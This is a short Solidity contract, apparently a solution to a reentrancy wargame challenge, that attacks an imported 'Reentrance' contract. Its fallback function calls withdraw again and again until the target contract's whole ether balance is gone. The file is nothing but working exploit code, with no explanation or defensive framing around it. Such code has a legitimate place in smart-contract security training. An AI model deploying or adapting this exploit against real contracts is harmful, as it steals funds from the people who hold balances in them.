// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract AttackReentrace {
    address public reentrance;

    constructor(address reentrance_) public {
        reentrance = reentrance_;
    }

    function attack() external {
        Reentrance(payable(reentrance)).withdraw(0.001 ether);
    }

    fallback() external payable {
        if (reentrance.balance > 0) {
            Reentrance(payable(reentrance)).withdraw(reentrance.balance);
        }
    }
}
